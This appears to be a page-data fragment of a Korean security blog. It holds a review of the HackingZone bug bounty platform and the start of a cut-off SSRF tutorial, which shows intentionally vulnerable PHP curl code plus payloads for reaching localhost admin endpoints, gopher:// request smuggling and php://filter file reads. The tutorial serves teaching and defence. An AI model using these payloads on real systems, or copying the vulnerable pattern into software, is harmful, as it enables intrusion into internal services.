url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAcABQDASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAEEBQIDBv/EABYBAQEBAAAAAAAAAAAAAAAAAAACA//aAAwDAQACEAMQAAABrp0zHdQFiK6B7HhKGH//xAAdEAACAgIDAQAAAAAAAAAAAAABAgADERIEECEx/9oACAEBAAEFAlSHjroV9FFig124souZj9G0Ex3/AP/EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8BH//EABgRAAIDAAAAAAAAAAAAAAAAAAAQERIh/9oACAECAQE/AbSY/wD/xAAeEAABBAEFAAAAAAAAAAAAAAABABARITETICMykf/aAAgBAQAGPwIXCzbRxldfCp0y2Qr2f//EAB4QAAMAAQQDAAAAAAAAAAAAAAABESEQMUGRYXHh/9oACAEBAAE/Iaw8ghb2OyYykxc5TYvgr8iywehXtfaE+MqbKRbzr//aAAwDAQACAAMAAAAQlxv8/8QAFhEBAQEAAAAAAAAAAAAAAAAAEQEQ/9oACAEDAQE/EC0rjn//xAAYEQACAwAAAAAAAAAAAAAAAAAAARARMf/aAAgBAgEBPxBrguX/xAAeEAEBAAICAgMAAAAAAAAAAAABEQAhMUFRoXGRwf/aAAgBAQABPxA2EOyYAKUdNMWwdYQMCUbCxzcndUa95UEebEfeMQQr5TjzTAkKr039wE0uyEM3527uT5+8CEz/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hack_the_challenge.jpg\"\n        title=\"./hack_the_challenge.jpg\"\n        src=\"/static/7cce30b10df5fbc9c065efce7b70c80f/80e3c/hack_the_challenge.jpg\"\n        srcset=\"/static/7cce30b10df5fbc9c065efce7b70c80f/4ec73/hack_the_challenge.jpg 180w,\n/static/7cce30b10df5fbc9c065efce7b70c80f/158ba/hack_the_challenge.jpg 360w,\n/static/7cce30b10df5fbc9c065efce7b70c80f/80e3c/hack_the_challenge.jpg 720w,\n/static/7cce30b10df5fbc9c065efce7b70c80f/47311/hack_the_challenge.jpg 1080w,\n/static/7cce30b10df5fbc9c065efce7b70c80f/644c5/hack_the_challenge.jpg 1440w,\n/static/7cce30b10df5fbc9c065efce7b70c80f/85d57/hack_the_challenge.jpg 2481w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>2020년에 진행했던 Hack the Challenge 대회에 참여하면서 취약점 제보 과정을 통해 접하게 되었었습니다. 저의 생각으로 국내 버그 바운티 프로그램으로 KISA 보안 취약점 제보 서비스, 각 메이저한 기업에서 하는 곳을 제외하고는 찾아보긴 힘들었지만, 삼성 SDS 해킹 존을 새롭게 접하게 되었습니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABuUlEQVQoz22QS2sTURSAs68r/4f/oOAqoG7EneLOlQsRBDcWdCW6MhBXFhFadSEIbhSxPkBtFVoRSSeVjpKYhHTSxpnM407vzHnce2QmKaah3+IeDvd+53ErWEJIOs8GkR8rlSQqThKcQJYsIGSYIwLgfwCgUgZk5jCONxqb3340nJ/u7vAvFC9JadUMOkGqlM5TnHYP5KI+UZqm3o7neV4YhsYYItzXWW+nver/6v957+/1t1oDZjok0wEIkCoFkBNxDoREiUqHQZjGueu24ijYHfo0BSJWRMRKQUx6pBIxIpZFqDwnV0pnoyiUwxhjKuMgIk3Xvf9ocfnpkxfrg3sfolfO/pe11Xq97jiOiEAxJhDRrMxcNHn98s2J6nz17Knzte/Hr7cvP/Nv3bwxN3dsaWlZRDKtiQgAZmVri+mCKOx2etEobHnD1l6caP7daXd63aJh+T3MjIiz8iSxdlzFMhUFRTSKKZcmImY2xhwhj3duONtXri1cXbj98PHzlU8bja2mcS7I59PSXUERwqLzEWNzKa99XT9ZPXPu4qU7tQd3a4ub2y6+nZePVem/Y5E804jIbKblfzplWghr4BWFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hacking_zone_1.png\"\n        title=\"./hacking_zone_1.png\"\n        src=\"/static/ad9fac98c2c20c36b8a519b05f6b88a0/37523/hacking_zone_1.png\"\n        srcset=\"/static/ad9fac98c2c20c36b8a519b05f6b88a0/e9ff0/hacking_zone_1.png 180w,\n/static/ad9fac98c2c20c36b8a519b05f6b88a0/f21e7/hacking_zone_1.png 360w,\n/static/ad9fac98c2c20c36b8a519b05f6b88a0/37523/hacking_zone_1.png 720w,\n/static/ad9fac98c2c20c36b8a519b05f6b88a0/302a4/hacking_zone_1.png 1080w,\n/static/ad9fac98c2c20c36b8a519b05f6b88a0/07a9c/hacking_zone_1.png 1440w,\n/static/ad9fac98c2c20c36b8a519b05f6b88a0/161ec/hacking_zone_1.png 1840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해킹존 버그바운티 플랫폼 서비스는 해당 사진과 같이 취약점 점검이 필요한 기업들이 나열되어 있으며 취약점 점검 시 발견한 유효 취약점 최대 포상 금액이 명시되어 있어 화이트 해커들이 쉽게 파악할 수 있습니다. 또한, 자신의 분야와 관련된 분석을 진행할 수 있도록 태그로 명시되어 있어 직접 들어가 보지 않아도 빠르게 파악할 수 있습니다. 이처럼 사용자에게 친숙한 UI/UX를 제공함으로써 접근성이 좋아 만족도가 높습니다.</p>\n<p>유효 취약점을 발견한다면 정해진 포상 금액과 포인트를 받게 됩니다. 해당 포인트 제도는 옆의 리포터 순위에 명시된 것처럼 순위 제도를 운용하여 화이트 해커들 간의 경쟁과 재미를 부여해줍니다. 순위이 높을수록 명예를 얻게 되며 또한 Private 버그 바운티에 초대를 받을 기회가 생깁니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACFklEQVQoz3WQTWsTURSG79yZuQkMdKloFakL3fiZpEkVP0oQiiK2oAZECRKhTYsxGtT+BH9A60ZpUwKKaS0maav9H+66MSWYtkmTmcnMJDP3U6YWBKvP9pznPbwHXL567f7DB2N3E5FIJBwOh0OhwWg0+Tg5mU5P/YdsNvsy9+LOownwfaO6Xd/abbZty7Y6tmPZumH/aFiUYMrEP6GUCiEqlRXQc3qEeB2zxblgjHmuhz1smpbXdVqNWrfrcsYN3TBME2MiuBBMUOLL5VIZMCYEc7frVYwpIaRjmB3TZMzfajdrnkt82cckmPh3+b5cKVeA4IKRbnOnhj3q9ly9rRu6QYkfudvYtDrOQZnt9VlbXQOMctcxa5sbtmUbbb3+s75d38IeZhQ3d6qO3aOYtPZwXY8zzij7nbJaWQF+FueUkgN/4b1uC3tYCIFdF3uY8/0B86uK9W/r4O3sbCmfX8jPzc2//7xYLC5/fbe4nC8sfFxami8UPnwqlspf3szMZLKZ9PiTTG7q9avn07nsxGR6OH4DIASfnT51sv+Q1odux0eGbk6D6/cOHz02ELpy/NzwmUsjo6O34uNPz54P9wHQf+LIxdjAWPQCQir4CwglFEAyCkgAQAkghKAsQyipSIWKoqiKIquSLMmKDGUIIQTJZDKRSKRSqaFYTNOCAADJByKEAoEAQqokQT9X+oOqIk3TgsHgL6U/nRa6sHniAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hackingzone_vdi.png\"\n        title=\"./hackingzone_vdi.png\"\n        src=\"/static/06efbe0f441708c400f29490e0ca147b/37523/hackingzone_vdi.png\"\n        srcset=\"/static/06efbe0f441708c400f29490e0ca147b/e9ff0/hackingzone_vdi.png 180w,\n/static/06efbe0f441708c400f29490e0ca147b/f21e7/hackingzone_vdi.png 360w,\n/static/06efbe0f441708c400f29490e0ca147b/37523/hackingzone_vdi.png 720w,\n/static/06efbe0f441708c400f29490e0ca147b/302a4/hackingzone_vdi.png 1080w,\n/static/06efbe0f441708c400f29490e0ca147b/07a9c/hackingzone_vdi.png 1440w,\n/static/06efbe0f441708c400f29490e0ca147b/2c0d3/hackingzone_vdi.png 1849w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>취약점 분석 시에 Virtual Desktop Infrastructure, VDI (가상 데스크톱 인프라) 환경을 제공하여 대상 플랫폼 서비스의 취약점을 분석할 수 있는 공간과 분석에 필요한 몇 가지 기본적인 도구와 언어 등이 설치되어 있어 해킹 범위와 공격방법의 제한이 없는 가상환경을 제공하기 때문에 중요한 취약점을 더 많이 발견할 수 있습니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 65.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQ4y41TixKEIAjs/z+2rHyhyN6gad1jupjZwQjXBXEiIlnXFcwszIyOnBmcGaUUSCnYjYE1BpISUArADOQMYYYAIiIAIJNu9t4LEYEoIaUGXSv0v1rYNth5hlsWeCVfFiRrK7FSdcZJFc7zXBXixiIRNmsrdueqj6oQKricClWZEqpHO+kNNVYK3LohHoqQUi1diJBirBX13EEYY3xTNEjbB/y2wRmDuO8ga5GcA4fQe3gS5pxhrYV6NPmnsotKjWcFM8px0MAlr15KCGE0/5Owe42/gdsEtMukuq6ESqYl98C15E9/h54zaUOdc1+bfpH9Ix49VJVPTu/rO6tz6L3H0d+f9oCoJxxzuBhxPiBE+oK+licKx0sRkaKbQiSpzy1doE/xGKc/hP1HegGkngLm0iRHAAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hackingzone_vuln_blank.png\"\n        title=\"./hackingzone_vuln_blank.png\"\n        src=\"/static/6553c03ee18277ed966c428544208bd2/37523/hackingzone_vuln_blank.png\"\n        srcset=\"/static/6553c03ee18277ed966c428544208bd2/e9ff0/hackingzone_vuln_blank.png 180w,\n/static/6553c03ee18277ed966c428544208bd2/f21e7/hackingzone_vuln_blank.png 360w,\n/static/6553c03ee18277ed966c428544208bd2/37523/hackingzone_vuln_blank.png 720w,\n/static/6553c03ee18277ed966c428544208bd2/302a4/hackingzone_vuln_blank.png 1080w,\n/static/6553c03ee18277ed966c428544208bd2/07a9c/hackingzone_vuln_blank.png 1440w,\n/static/6553c03ee18277ed966c428544208bd2/a4f81/hackingzone_vuln_blank.png 1508w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해킹 존 플랫폼을 활용하여 취약점 분석을 하고 유효 취약점 제보를 하면서 가장 좋았던 점은 취약점 보고서를 제출할 때 위의 사진에 명시된 주제에 맞게 내용을 적어 나가면 되어 빠르게 부분의 취약점을 보고할 수 있었던 점이었습니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7klEQVQ4y5VSWY7bMAz1/W/TE/QMBdp+TJFkMplkYseLJGvhJqqQ7QZpOyg6DwRNk3ziIjXE8iBMzFlL1iKqOWcVzaoseQ2xyF0SUsMiSIS0xZB5nKbJGGOtieEGbrQ2pMQ5EwsSI9GaCUgNMjOJcAakyVhv/W532O0Pz4fj6fr2vT3uX15ubW+Mm31AYpa8VFrIwnkA38OcEJ0PR9vZFBPgFP3J9smnBHiZx242kBCJjXWwnFHJRcu+Pf+4noAoIn67PvfeIUtnp6+XfUQEoqf2dLy9CWtMsNsfZh9EaqdNiJGAMmeRKiq6Glw/WXK1a5SFtlXVkKwzj+OISFoKL6gNrUl1K4vKoqVo+Q2qWsnz7EspROS9r+Rll3eDiESk/IWN7H1Q1ZRS27Y55/J/2MiTscz19owxiPgxcgJYtiIAgIAIWA3cNC4KCVcPEeHiz3nZtnOuzobonBMRVZX3oKpaSl7K5IqlMhAlJCD2MU3WzSECM1D1AHHCLTpZ1/VDBFg9qzT10dcXyyElO88hppWGLLMP3a2/9UM/jOfL5fn40nb1t8owhgTNOA4gVD6IekGIzaW7JoS8zqH6j+zH6Eb+9OXz6+v5fD4Pw3BPehePp2/kUgoixgeEEFJKq303Qghd14UQ/iT/alk/OvNPcMFUb8QUbSMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hackingzone_vuln_verify1.png\"\n        title=\"./hackingzone_vuln_verify1.png\"\n        src=\"/static/da7c76f0d74a5229411acc1b75644e96/37523/hackingzone_vuln_verify1.png\"\n        srcset=\"/static/da7c76f0d74a5229411acc1b75644e96/e9ff0/hackingzone_vuln_verify1.png 180w,\n/static/da7c76f0d74a5229411acc1b75644e96/f21e7/hackingzone_vuln_verify1.png 360w,\n/static/da7c76f0d74a5229411acc1b75644e96/37523/hackingzone_vuln_verify1.png 720w,\n/static/da7c76f0d74a5229411acc1b75644e96/d54e4/hackingzone_vuln_verify1.png 747w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABcRAAAXEQHKJvM/AAAC10lEQVQozx2S609SAQBHf8gsH4Ega7Ymla+SULPX0h6rttZWrg99qeyx1sqtttLSJmr3cq88BF0UCzMntQuiQIKw1LXKUsxQU7jARdTmVrbK2Wp96Q+4zc6fcM6BJPD4QtEzjWrDoOkKvj9fmxHrRld1I6ZOXIeSdSFjyZet6GurKrHrq9Pj3Qp886DcYxYYHz1EUcE2rNJlY06Y2y3Vjzo7rkASsS8fXXy5vIlzLils2iJLPVlM0NRhlZY+NHqmRi4JPL6RN+/5Wjrv+y3kmHrF2FPwAO7cvAWTwQikAdGxoOcTG1vhglPzwPiDNPhq0vBWn5bL/0JzE5GsptSprab76dN/fsD7/u3hF1Pvff5g4FV/YPjywdzCFJ2hRUY001IjQUmu6Yj1W2ccuuNh79Bu1u0ApizAaDMQfAjZ33fQNhEgKTV4nheMvRnGxEjgZHQ6NBYPsx8mRgK3eJ6HXq+XkxS1x0TQklM6lTQr0v3kwKx/Oo9zDyMpZBUIQ1ZB0owVWLTBfLcJBE1BMNEhRKgdmGmv2Bh3BnPn+iYRtNzhsV1Yp6e3EDSV30bS6/frakXyaE9nRWIoUhz3vIMsYhfuTPQLM1m7sMxuwEBVA1RaGllBa1JylMGa8LOjBRHnoDLsHJFOWq/yOedSVFo6n6SoYj1JZZ/XNWVmhWwG5ZzXvZlzOiCLdGNXwgcZa0e5zQDP9UY0aGiAZwWZ450QhK2nd872f9qX8H+WTnYRKzsuilRaejVcSQtJbTvbrJJvZh2vDy4M/FTOer5AzDK38zl3rZhlqktdbbKJyrrkeh2dWmVuSQfPQ/zRemx33OtThnrfiKL2symf+1Bn1MpIipJpSLWIxwLEYaYgh3OVZsd6SyBimUQe557PCDOxMkeroqP23qqfIw1aet/fwsp18nHrpQMLA9G9c/5EDueq2Zvw/d+GJtXQkGrwla1YxzLYFHNiY7QH/wDVjEeKBM+UHQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./hackingzone_crowd.png\"\n        title=\"./hackingzone_crowd.png\"\n        src=\"/static/2cf96c1d9a34088cf3a439ca487b8b66/37523/hackingzone_crowd.png\"\n        srcset=\"/static/2cf96c1d9a34088cf3a439ca487b8b66/e9ff0/hackingzone_crowd.png 180w,\n/static/2cf96c1d9a34088cf3a439ca487b8b66/f21e7/hackingzone_crowd.png 360w,\n/static/2cf96c1d9a34088cf3a439ca487b8b66/37523/hackingzone_crowd.png 720w,\n/static/2cf96c1d9a34088cf3a439ca487b8b66/302a4/hackingzone_crowd.png 1080w,\n/static/2cf96c1d9a34088cf3a439ca487b8b66/07a9c/hackingzone_crowd.png 1440w,\n/static/2cf96c1d9a34088cf3a439ca487b8b66/6b26f/hackingzone_crowd.png 1658w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\n최종적으로 보고한 취약점을 분석/평가 후 KISA 기준에 포상금을 산정하여 결과를 알려주며 해킹 존 보안 연구원들께서 해당 취약점이 어떤 영향을 끼치는지에 대한 내용과 평가 기준을 답변해주어 의사소통이 원활합니다.</p>\n<p><a href=\"https://hackingzone.net/Home\">HackingZone 해킹존</a></p>","frontmatter":{"date":"July 01, 2021","title":"버그바운티 플랫폼 HackingZone 리뷰","categories":"Talk","author":"Zer0Luck","emoji":"🍉"},"fields":{"slug":"/hackingzone_event/"}},"prev":{"id":"0f43c582-f5d1-5b7e-9887-75891178bca8","html":"<h1 id=\"ssrf-overview\" style=\"position:relative;\"><a href=\"#ssrf-overview\" aria-label=\"ssrf overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Overview</h1>\n<ul>\n<li>웹 어플리케이션에서 요청이 보내질 떄 웹 어플리케이션이 작동하고 있는 서버 내부의 포트, 서버와 연결된 내부망에 요청을 보낼 수 가 있죠</li>\n<li>server-side에서 변조된 요청, 의도하지 않은 서버로 요청을 보내어 별도의 인증 없이 내부방 안에서 요청되는 데이터를 조작하는 공격 기법입니다.</li>\n<li>즉, 공격자가 의도한 서버로 요청을 가게 하는 취약점으로 CSRF 와 유사한 형태지만 클라이언트가 아닌 서버에 직접 영향을 줄 수 있다는 점에서 차이가 있습니다.</li>\n</ul>\n<p><strong>다른 공격 기법과 연계</strong></p>\n<ul>\n<li>다른 취약점과 연계에서 사용할 경우 RCE로 이어질 수 있기 때문에 파급력이 큽니다.\n<ul>\n<li>XXE 취약점 + SSRF 취약점</li>\n<li>SSRF 취약점 + CRLF Injection 취약점</li>\n<li>SSRF 취약점 + Redis-Server 연계 취약점</li>\n<li>SSRF + MongoDB 연계 취약점</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"php-ssrf-example\" style=\"position:relative;\"><a href=\"#php-ssrf-example\" aria-label=\"php ssrf example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SSRF Example</h2>\n<ul>\n<li>php curl API가 설정된 대상 애플리케이션 환경에서 GET 메서드의 url 쿼리를 통해 SSRF 공격이 수행되는 예시입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>내부망에 접근이 가능한 영역에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost/api/admin</span></code></pre></div>\n<ul>\n<li>내부망 서버에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost:8000/</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">Gopher</code> 를 활용한 TCP 연결후 POST 요청</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=gopher://localhost:8000/_POST%20HTTP/1.1%0d%0a</span></code></pre></div>\n<h1 id=\"ssrf-exploit-technique\" style=\"position:relative;\"><a href=\"#ssrf-exploit-technique\" aria-label=\"ssrf exploit technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Exploit Technique</h1>\n<h2 id=\"ssrf-공격시-사용-가능한-protocol-종류\" style=\"position:relative;\"><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\" aria-label=\"ssrf 공격시 사용 가능한 protocol 종류 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF 공격시 사용 가능한 Protocol 종류</h2>\n<ul>\n<li><code class=\"language-text\">http://</code> : HTTP 접속 용</li>\n<li><code class=\"language-text\">ftp://</code> : ftp 접속 용</li>\n<li><code class=\"language-text\">dict://</code> : RFC 2229 서버 액세스 용</li>\n<li><code class=\"language-text\">sftp://</code> : sftp 접속 용</li>\n<li><code class=\"language-text\">tftp://</code> : tftp 접속 용</li>\n<li><code class=\"language-text\">ldap://</code> : JAVA ES 솔루션 Directory Server 용</li>\n<li><code class=\"language-text\">gopher://</code> : TCP 연결용</li>\n<li><code class=\"language-text\">netdoc://</code> : JDK9 버전 이하에서 사용, URL을 통해 외부적 네트워크 문서 참조용</li>\n<li><code class=\"language-text\">file://</code> : 파일 읽기용</li>\n</ul>\n<h3 id=\"php-wrapper-only-php\" style=\"position:relative;\"><a href=\"#php-wrapper-only-php\" aria-label=\"php wrapper only php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Wrapper (Only PHP)</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># PHP://filter/convert.base64-encode/resource=파일 경로</span></code></pre></div>\n<h3 